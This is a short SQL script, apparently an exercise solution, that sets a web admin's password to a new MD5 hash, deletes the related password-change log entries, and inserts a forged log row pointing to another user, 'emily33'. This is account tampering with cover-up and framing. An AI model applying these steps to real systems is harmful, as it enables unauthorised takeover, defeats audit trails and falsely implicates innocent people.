-- Alter web admin (admin) password to "oops!"
-- Erase password change logs
-- Add data: 

-- Alter
UPDATE "users"
SET "password" = '982c0381c279d139fd221fce974916e7'
WHERE "username" = 'admin';

-- Erase
DELETE FROM "user_logs"
WHERE "type" = 'update' AND "old_username" = 'admin';


INSERT INTO "user_logs" ("type", "old_username", "new_username", "old_password", "new_password")
SELECT 'update', 'admin', 'admin', 'e10adc3949ba59abbe56e057f20f883e', (
    SELECT "password"
    FROM "users"
    WHERE "username" = 'emily33'
);

